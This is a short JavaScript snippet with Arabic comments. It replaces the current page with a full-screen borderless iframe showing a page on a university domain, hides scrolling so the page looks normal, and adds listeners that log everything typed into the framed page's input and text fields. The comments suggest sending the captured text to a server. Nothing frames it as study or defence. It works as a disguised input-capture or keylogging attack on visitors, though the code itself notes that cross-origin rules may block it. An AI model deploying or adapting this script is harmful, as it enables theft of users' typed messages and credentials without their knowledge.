(function() {
    // تفريغ محتوى الصفحة الحالية بالكامل
    document.documentElement.innerHTML = '';

    // إعادة كتابة محتوى الصفحة الجديد
    document.documentElement.innerHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>صفحة الويب</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden; /* إخفاء التمرير لتبدو الصفحة طبيعية */
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none; /* إزالة الحدود لتكامل الشكل */
        }
    </style>
</head>
<body>
    <iframe id="externalSite" src="https://inquiries.helwan.edu.eg/sarhne/sarhne.com-440/"></iframe>
    <script>
        // كود JavaScript لضمان التحميل السلس وتسجيل الإدخال
        window.onload = function() {
            var iframe = document.getElementById('externalSite');
            
            iframe.onload = function() {
                console.log("تم تحميل الموقع الخارجي بنجاح");
                
                try {
                    // الوصول إلى محتوى الـ iframe
                    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    
                    // البحث عن جميع عناصر الإدخال داخل الـ iframe
                    var inputs = iframeDoc.querySelectorAll('input, textarea');
                    
                    // إضافة مستمع للأحداث لكل حقل إدخال
                    inputs.forEach(function(input) {
                        input.addEventListener('input', function(event) {
                            // تسجيل النص الذي يتم كتابته
                            console.log('تم إدخال النص:', event.target.value);
                            
                            // يمكنك تخزين النص في مصفوفة أو إرساله إلى خادم
                            var log = event.target.value;
                            // هنا يمكنك إرسال النص إلى مكان آخر (مثل خادم أو تخزين محلي)
                            // مثال: localStorage.setItem('inputLog', log);
                        });
                    });
                    
                    console.log("تم إعداد تسجيل الإدخال بنجاح");
                } catch (e) {
                    console.error("خطأ: لا يمكن الوصول إلى محتوى الـ iframe بسبب Same-Origin Policy", e);
                }
            };
        };
    </script>
</body>
</html>
    `;
})();
